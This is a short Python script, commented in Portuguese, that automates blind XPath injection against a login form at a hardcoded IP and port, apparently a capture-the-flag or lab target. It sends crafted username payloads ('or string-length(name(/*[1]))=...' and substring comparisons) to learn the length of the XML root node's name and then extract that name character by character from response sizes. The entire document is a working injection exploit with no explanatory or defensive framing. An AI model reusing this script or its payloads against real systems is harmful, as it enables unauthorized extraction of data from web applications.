#Script 1 - Responsável por encontrar o tamanho e o nome do node root (accounts)

import requests
from rich import print #Cores no print
import sys
from bs4 import BeautifulSoup #Parsing de HTML
import string

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

url = "http://83.136.254.158:41174/index.php"

for x in range(1, 100):
	valor = f"invalid' or string-length(name(/*[1]))={x} and '1'='1" # Loop pra mudar o valor de X
	data = {
		'username': valor,
		'msg': '123'
	}
	response = requests.post(url, data=data, headers=headers)
	html_response = response.text # Salva a response em uma variável
	soup = BeautifulSoup(html_response, 'html.parser') # Faz o parsing da response salva
	results_tag = soup.find_all('script') # Filtra pela tag HTML "script"

	for result in results_tag: #Usado para pega apenas o alert
		tam = (len(result.text)) # Armazena o tamanho da resposta
		print(f"\n[bold yellow][+]--> Test with {valor} <--[+][/bold yellow]\n") # Printa o valor utilizado no loop 

	if tam == 30:
		print(f"\n[bold red]Error![/bold red]\n")
	else:
		print(f"\n[bold green]Success[/bold green]\n")
		print(f"\n[bold green]Correct Number: {x}[/bold green]\n")
		print(f"\n[bold green]Extracting name...[/bold green]\n")
		i = x + 1
		name = ''
		for a in range(1, i):
			printables = string.printable 
			for char in printables:
				valor = f"invalid' or substring(name(/*[1]),{a},1)='{char}' and '1'='1"
				data = {
					'username': valor,
					'msg': '123'
					}
				response = requests.post(url, data=data, headers=headers, proxies=proxies)
				html_response = response.text # Salva a response em uma variável
				soup = BeautifulSoup(html_response, 'html.parser') # Faz o parsing da response salva
				results_tag = soup.find_all('script') # Filtra pela tag HTML "script"

				for result in results_tag: #Usado para pega apenas o alert
					tam = (len(result.text)) # Armazena o tamanho da resposta

				if tam == 36:
					name += char	
					print (name)
					break		
		break
